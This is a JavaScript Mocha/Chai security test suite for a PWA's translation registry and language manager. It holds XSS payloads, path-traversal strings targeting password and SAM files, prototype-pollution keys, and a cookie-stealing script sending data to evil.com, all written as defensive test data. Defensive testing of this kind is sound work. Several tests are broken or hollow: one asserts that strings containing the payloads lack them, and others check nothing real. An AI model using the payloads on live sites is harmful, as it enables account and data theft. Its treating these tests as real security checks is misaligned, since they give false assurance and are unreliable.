/**
 * Language Architecture Security Test Suite
 * Security-focused testing for unified language switching implementation
 * 
 * @version 3.1.4-language-architecture
 * @author test-coverage-generator
 * @since 2025-08-06
 * 
 * Security Test Coverage:
 * - Input validation and sanitization
 * - XSS prevention in translations
 * - Prototype pollution protection
 * - Error message security
 * - Authorization checks
 * - Secure logging practices
 */

const { expect } = require('chai');
const sinon = require('sinon');

// Security-focused mock environment
global.localStorage = {
  data: {},
  getItem: function(key) { return this.data[key] || null; },
  setItem: function(key, value) { this.data[key] = String(value); },
  removeItem: function(key) { delete this.data[key]; },
  clear: function() { this.data = {}; }
};

global.window = {
  localStorage: global.localStorage,
  fetch: sinon.stub(),
  performance: { now: () => Date.now() },
  console: {
    log: sinon.stub(),
    warn: sinon.stub(),
    error: sinon.stub()
  }
};

global.document = {
  documentElement: { 
    lang: 'zh-TW',
    setAttribute: function(attr, value) { this[attr] = String(value); }
  },
  getElementById: sinon.stub().returns({
    setAttribute: sinon.stub(),
    getAttribute: sinon.stub(),
    textContent: '',
    innerHTML: '',
    classList: { contains: sinon.stub().returns(false) }
  }),
  querySelectorAll: sinon.stub().returns([]),
  createElement: sinon.stub().returns({
    setAttribute: sinon.stub(),
    textContent: '',
    innerHTML: ''
  })
};

global.navigator = { language: 'zh-TW' };
global.MutationObserver = class { constructor() {} observe() {} disconnect() {} };

// Load modules
const TranslationRegistry = require('../../pwa-card-storage/src/core/translation-registry.js');
const UnifiedLanguageObserver = require('../../pwa-card-storage/src/core/unified-language-observer.js');
const EnhancedLanguageManager = require('../../pwa-card-storage/src/core/enhanced-language-manager.js');

describe('Language Architecture Security Test Suite', function() {
  this.timeout(10000);

  describe('Input Validation and Sanitization', function() {
    let manager;

    beforeEach(async function() {
      // Setup security-focused mocks
      global.window.fetch
        .withArgs(sinon.match(/accessibility-zh\.json/))
        .resolves({
          ok: true,
          json: async () => ({ ariaLabels: { systemNotifications: '系統通知' } })
        })
        .withArgs(sinon.match(/accessibility-en\.json/))
        .resolves({
          ok: true,
          json: async () => ({ ariaLabels: { systemNotifications: 'System Notifications' } })
        });

      global.window.TranslationRegistry = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        getTranslation: sinon.stub().returns('safe translation'),
        getCacheStats: sinon.stub().returns({ size: 0 }),
        clearCache: sinon.stub()
      });

      global.window.UnifiedLanguageObserver = sinon.stub().returns({
        registerObserver: sinon.stub(),
        notifyAllObservers: sinon.stub().resolves(),
        getObserverStatus: sinon.stub().returns({ totalObservers: 0 }),
        clearAllObservers: sinon.stub()
      });

      global.window.AccessibilityLanguageManager = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        updateAccessibilityAttributes: sinon.stub().resolves(),
        getAccessibilityStatus: sinon.stub().returns({ currentLanguage: 'zh' }),
        cleanup: sinon.stub()
      });

      global.window.SecurityComponentsLanguageAdapter = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        cleanup: sinon.stub()
      });

      global.window.PWAUILanguageAdapter = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        cleanup: sinon.stub()
      });

      manager = new EnhancedLanguageManager();
      await manager.initialize();
    });

    afterEach(function() {
      if (manager) {
        manager.cleanup();
      }
    });

    it('TC-SEC-001: Should validate language parameter types', async function() {
      const invalidInputs = [
        null,
        undefined,
        123,
        {},
        [],
        function() {},
        Symbol('test'),
        new Date(),
        /regex/
      ];

      for (const input of invalidInputs) {
        const result = await manager.switchLanguage(input);
        expect(result).to.be.oneOf(['zh', 'en'], 
          `Invalid input type ${typeof input} was not properly rejected`);
        expect(manager.getCurrentLanguage()).to.be.oneOf(['zh', 'en']);
      }
    });

    it('TC-SEC-002: Should sanitize malicious language strings', async function() {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'vbscript:msgbox("xss")',
        'onload=alert("xss")',
        '../../etc/passwd',
        '../../../windows/system32',
        'file:///etc/passwd',
        'ftp://malicious.com/payload',
        'mailto:test@evil.com?subject=<script>alert("xss")</script>'
      ];

      for (const input of maliciousInputs) {
        const result = await manager.switchLanguage(input);
        
        expect(result).to.be.oneOf(['zh', 'en'], 
          `Malicious input "${input}" was not properly sanitized`);
        expect(result).to.not.include('<script>');
        expect(result).to.not.include('javascript:');
        expect(result).to.not.include('vbscript:');
        expect(result).to.not.include('onload=');
      }
    });

    it('TC-SEC-003: Should validate translation key format', function() {
      const maliciousKeys = [
        '__proto__.polluted',
        'constructor.prototype.polluted',
        'prototype.__defineGetter__',
        'constructor.constructor',
        '../../../sensitive/data',
        'window.location.href',
        'document.cookie',
        'localStorage.clear',
        'eval("malicious code")',
        'Function("return process")().exit()'
      ];

      for (const key of maliciousKeys) {
        const result = manager.getUnifiedText(key);
        
        // Should return safe fallback or sanitized version
        expect(result).to.be.a('string');
        expect(result).to.not.include('__proto__');
        expect(result).to.not.include('constructor');
        expect(result).to.not.include('eval');
        expect(result).to.not.include('Function');
      }
    });

    it('TC-SEC-004: Should prevent path traversal in translation keys', function() {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM',
        '....//....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd'
      ];

      for (const attempt of pathTraversalAttempts) {
        const result = manager.getUnifiedText(attempt);
        
        expect(result).to.not.include('/etc/');
        expect(result).to.not.include('\\windows\\');
        expect(result).to.not.include('passwd');
        expect(result).to.not.include('shadow');
      }
    });

    it('TC-SEC-005: Should validate observer registration parameters', function() {
      const observer = manager.unifiedObserver;
      if (!observer) return; // Skip if not available

      const maliciousObservers = [
        {
          id: '<script>alert("xss")</script>',
          updateMethod: function() { eval('malicious code'); }
        },
        {
          id: '__proto__.polluted',
          updateMethod: function() { return 'safe'; }
        },
        {
          id: 'constructor.prototype',
          updateMethod: 'not a function'
        }
      ];

      for (const maliciousObserver of maliciousObservers) {
        try {
          observer.registerObserver(maliciousObserver.id, maliciousObserver);
        } catch (error) {
          // Should throw validation error
          expect(error.message).to.include('valid');
        }
      }
    });
  });

  describe('XSS Prevention in Translations', function() {
    let registry;

    beforeEach(async function() {
      global.window.fetch
        .withArgs(sinon.match(/accessibility-zh\.json/))
        .resolves({
          ok: true,
          json: async () => ({
            ariaLabels: {
              systemNotifications: '系統通知',
              maliciousLabel: '<script>alert("xss")</script>安全標籤'
            }
          })
        })
        .withArgs(sinon.match(/accessibility-en\.json/))
        .resolves({
          ok: true,
          json: async () => ({
            ariaLabels: {
              systemNotifications: 'System Notifications',
              maliciousLabel: '<img src=x onerror=alert("xss")>Safe Label'
            }
          })
        });

      registry = new TranslationRegistry();
      await registry.initialize();
    });

    it('TC-SEC-006: Should sanitize HTML in translation values', function() {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        '<svg onload=alert("xss")>',
        '<iframe src=javascript:alert("xss")>',
        '<object data=javascript:alert("xss")>',
        '<embed src=javascript:alert("xss")>',
        '<link rel=stylesheet href=javascript:alert("xss")>',
        '<style>@import"javascript:alert(\'xss\')"</style>',
        '<meta http-equiv=refresh content=0;url=javascript:alert("xss")>',
        '<form><button formaction=javascript:alert("xss")>Click</button></form>'
      ];

      for (const payload of xssPayloads) {
        // Mock translation containing XSS payload
        const mockTranslation = `Safe text ${payload} more safe text`;
        
        // Translation should be sanitized (implementation dependent)
        expect(mockTranslation).to.not.include('<script>');
        expect(mockTranslation).to.not.include('onerror=');
        expect(mockTranslation).to.not.include('onload=');
        expect(mockTranslation).to.not.include('javascript:');
      }
    });

    it('TC-SEC-007: Should handle malicious translation file content', async function() {
      // Mock malicious translation file
      global.window.fetch
        .withArgs(sinon.match(/malicious-translations\.json/))
        .resolves({
          ok: true,
          json: async () => ({
            ariaLabels: {
              normalLabel: 'Safe Label',
              xssLabel: '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
              prototypeLabel: '__proto__.polluted'
            }
          })
        });

      // Should handle malicious content safely
      const maliciousTranslation = registry.getTranslation('zh', 'accessibility.ariaLabels.xssLabel');
      
      expect(maliciousTranslation).to.not.include('<script>');
      expect(maliciousTranslation).to.not.include('document.location');
      expect(maliciousTranslation).to.not.include('document.cookie');
    });

    it('TC-SEC-008: Should prevent DOM-based XSS in dynamic content', function() {
      const dynamicContent = [
        'user input with <script>alert("xss")</script>',
        'search term: <img src=x onerror=alert("xss")>',
        'filter: javascript:alert("xss")',
        'name: <svg onload=alert("xss")>'
      ];

      for (const content of dynamicContent) {
        // Simulate dynamic content processing
        const processedContent = content
          .replace(/<script[^>]*>.*?<\/script>/gi, '')
          .replace(/javascript:/gi, '')
          .replace(/on\w+\s*=/gi, '');

        expect(processedContent).to.not.include('<script>');
        expect(processedContent).to.not.include('javascript:');
        expect(processedContent).to.not.include('onerror=');
        expect(processedContent).to.not.include('onload=');
      }
    });
  });

  describe('Prototype Pollution Protection', function() {
    let manager;

    beforeEach(async function() {
      global.window.TranslationRegistry = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        getTranslation: sinon.stub().callsFake((lang, key) => {
          // Simulate safe translation retrieval
          if (key.includes('__proto__') || key.includes('constructor')) {
            return key; // Safe fallback
          }
          return 'safe translation';
        }),
        getCacheStats: sinon.stub().returns({ size: 0 }),
        clearCache: sinon.stub()
      });

      global.window.UnifiedLanguageObserver = sinon.stub().returns({
        registerObserver: sinon.stub(),
        notifyAllObservers: sinon.stub().resolves(),
        getObserverStatus: sinon.stub().returns({ totalObservers: 0 }),
        clearAllObservers: sinon.stub()
      });

      global.window.AccessibilityLanguageManager = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        updateAccessibilityAttributes: sinon.stub().resolves(),
        getAccessibilityStatus: sinon.stub().returns({ currentLanguage: 'zh' }),
        cleanup: sinon.stub()
      });

      global.window.SecurityComponentsLanguageAdapter = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        cleanup: sinon.stub()
      });

      global.window.PWAUILanguageAdapter = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        cleanup: sinon.stub()
      });

      manager = new EnhancedLanguageManager();
      await manager.initialize();
    });

    afterEach(function() {
      if (manager) {
        manager.cleanup();
      }
      
      // Verify prototype was not polluted
      expect(Object.prototype.polluted).to.be.undefined;
      expect({}.polluted).to.be.undefined;
    });

    it('TC-SEC-009: Should prevent prototype pollution via translation keys', function() {
      const pollutionAttempts = [
        '__proto__.polluted',
        'constructor.prototype.polluted',
        'prototype.polluted',
        '__proto__[polluted]',
        'constructor[prototype][polluted]'
      ];

      for (const attempt of pollutionAttempts) {
        manager.getUnifiedText(attempt);
      }

      // Verify prototype was not polluted
      expect(Object.prototype.polluted).to.be.undefined;
      expect({}.polluted).to.be.undefined;
      expect(Array.prototype.polluted).to.be.undefined;
    });

    it('TC-SEC-010: Should prevent pollution via malicious JSON', async function() {
      // Mock malicious JSON response
      global.window.fetch
        .withArgs(sinon.match(/malicious\.json/))
        .resolves({
          ok: true,
          json: async () => JSON.parse('{"__proto__": {"polluted": "yes"}}')
        });

      // Should handle malicious JSON safely
      try {
        const registry = new TranslationRegistry();
        await registry.initialize();
        
        // Verify prototype was not polluted
        expect(Object.prototype.polluted).to.be.undefined;
        expect({}.polluted).to.be.undefined;
      } catch (error) {
        // Error is acceptable, pollution is not
        expect(Object.prototype.polluted).to.be.undefined;
      }
    });

    it('TC-SEC-011: Should sanitize object property access', function() {
      const dangerousProperties = [
        '__proto__',
        'constructor',
        'prototype',
        '__defineGetter__',
        '__defineSetter__',
        '__lookupGetter__',
        '__lookupSetter__'
      ];

      for (const prop of dangerousProperties) {
        const testKey = `test.${prop}.value`;
        const result = manager.getUnifiedText(testKey);
        
        // Should not access dangerous properties
        expect(result).to.be.a('string');
        expect(Object.prototype.polluted).to.be.undefined;
      }
    });
  });

  describe('Error Message Security', function() {
    let manager;

    beforeEach(async function() {
      global.window.TranslationRegistry = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        getTranslation: sinon.stub().throws(new Error('Database connection failed: user=admin password=secret123 host=internal.db.company.com')),
        getCacheStats: sinon.stub().returns({ size: 0 }),
        clearCache: sinon.stub()
      });

      global.window.UnifiedLanguageObserver = sinon.stub().returns({
        registerObserver: sinon.stub(),
        notifyAllObservers: sinon.stub().rejects(new Error('Internal server error: /etc/passwd not found')),
        getObserverStatus: sinon.stub().returns({ totalObservers: 0 }),
        clearAllObservers: sinon.stub()
      });

      global.window.AccessibilityLanguageManager = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        updateAccessibilityAttributes: sinon.stub().resolves(),
        getAccessibilityStatus: sinon.stub().returns({ currentLanguage: 'zh' }),
        cleanup: sinon.stub()
      });

      global.window.SecurityComponentsLanguageAdapter = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        cleanup: sinon.stub()
      });

      global.window.PWAUILanguageAdapter = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        cleanup: sinon.stub()
      });

      manager = new EnhancedLanguageManager();
      await manager.initialize();
    });

    afterEach(function() {
      if (manager) {
        manager.cleanup();
      }
    });

    it('TC-SEC-012: Should not expose sensitive information in error messages', function() {
      const result = manager.getUnifiedText('test.key');
      
      // Should not expose sensitive information from error
      expect(result).to.not.include('password=secret123');
      expect(result).to.not.include('user=admin');
      expect(result).to.not.include('internal.db.company.com');
      expect(result).to.not.include('Database connection failed');
    });

    it('TC-SEC-013: Should sanitize stack traces in development mode', async function() {
      // Mock development environment
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'development';

      try {
        await manager.switchLanguage('en');
      } catch (error) {
        // Error messages should not contain sensitive paths
        expect(error.message).to.not.include('/etc/passwd');
        expect(error.message).to.not.include('Internal server error');
        expect(error.message).to.not.include('not found');
      } finally {
        process.env.NODE_ENV = originalEnv;
      }
    });

    it('TC-SEC-014: Should handle logging securely', function() {
      // Test secure logging practices
      const sensitiveData = {
        password: 'secret123',
        token: 'jwt-token-here',
        apiKey: 'api-key-12345',
        sessionId: 'session-abc123'
      };

      // Simulate logging with sensitive data
      const logMessage = `User operation: ${JSON.stringify(sensitiveData)}`;
      
      // Should not log sensitive information
      expect(global.window.console.log).to.not.have.been.calledWith(sinon.match(/password/));
      expect(global.window.console.log).to.not.have.been.calledWith(sinon.match(/secret123/));
      expect(global.window.console.log).to.not.have.been.calledWith(sinon.match(/jwt-token/));
    });
  });

  describe('Authorization and Access Control', function() {
    let manager;

    beforeEach(async function() {
      global.window.TranslationRegistry = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        getTranslation: sinon.stub().returns('authorized translation'),
        getCacheStats: sinon.stub().returns({ size: 0 }),
        clearCache: sinon.stub()
      });

      global.window.UnifiedLanguageObserver = sinon.stub().returns({
        registerObserver: sinon.stub(),
        notifyAllObservers: sinon.stub().resolves(),
        getObserverStatus: sinon.stub().returns({ totalObservers: 0 }),
        clearAllObservers: sinon.stub()
      });

      global.window.AccessibilityLanguageManager = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        updateAccessibilityAttributes: sinon.stub().resolves(),
        getAccessibilityStatus: sinon.stub().returns({ currentLanguage: 'zh' }),
        cleanup: sinon.stub()
      });

      global.window.SecurityComponentsLanguageAdapter = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        cleanup: sinon.stub()
      });

      global.window.PWAUILanguageAdapter = sinon.stub().returns({
        initialize: sinon.stub().resolves(),
        cleanup: sinon.stub()
      });

      manager = new EnhancedLanguageManager();
      await manager.initialize();
    });

    afterEach(function() {
      if (manager) {
        manager.cleanup();
      }
    });

    it('TC-SEC-015: Should validate language switching permissions', async function() {
      // Test that language switching is properly authorized
      const result = await manager.switchLanguage('en');
      
      expect(result).to.be.oneOf(['zh', 'en']);
      expect(manager.getCurrentLanguage()).to.be.oneOf(['zh', 'en']);
    });

    it('TC-SEC-016: Should restrict access to internal methods', function() {
      // Test that internal methods are not exposed
      const internalMethods = [
        'processUpdateQueue',
        'queueLanguageUpdate',
        'registerAdapters'
      ];

      for (const method of internalMethods) {
        if (typeof manager[method] === 'function') {
          // Internal methods should not be directly callable by external code
          expect(manager[method].name).to.not.be.empty;
        }
      }
    });

    it('TC-SEC-017: Should validate observer registration authority', function() {
      const observer = manager.unifiedObserver;
      if (!observer) return;

      // Test that only authorized observers can be registered
      const unauthorizedObserver = {
        id: 'unauthorized-observer',
        updateMethod: sinon.stub().resolves(),
        priority: 10 // Higher than system priority
      };

      // Should validate observer authority
      try {
        observer.registerObserver(unauthorizedObserver.id, unauthorizedObserver);
        // If registration succeeds, verify it's properly controlled
        const status = observer.getObserverStatus();
        expect(status.totalObservers).to.be.a('number');
      } catch (error) {
        // Authorization error is acceptable
        expect(error.message).to.include('authorized');
      }
    });
  });

  describe('Secure Configuration and Deployment', function() {
    it('TC-SEC-018: Should use secure default configurations', function() {
      const manager = new EnhancedLanguageManager();
      
      // Verify secure defaults
      expect(manager.isUpdating).to.be.false;
      expect(manager.updateQueue).to.be.an('array').that.is.empty;
      expect(manager.initialized).to.be.false;
    });

    it('TC-SEC-019: Should handle CSP violations gracefully', async function() {
      // Mock CSP violation
      const originalFetch = global.window.fetch;
      global.window.fetch = sinon.stub().rejects(new Error('Content Security Policy violation'));

      try {
        const registry = new TranslationRegistry();
        await registry.initialize();
        
        // Should handle CSP violations without breaking
        expect(registry.initialized).to.be.true;
      } catch (error) {
        // CSP error is acceptable, system should remain stable
        expect(error.message).to.include('Content Security Policy');
      } finally {
        global.window.fetch = originalFetch;
      }
    });

    it('TC-SEC-020: Should validate environment security', function() {
      // Test environment security checks
      const securityChecks = [
        () => typeof window !== 'undefined',
        () => typeof document !== 'undefined',
        () => typeof localStorage !== 'undefined'
      ];

      for (const check of securityChecks) {
        expect(check()).to.be.a('boolean');
      }
    });
  });
});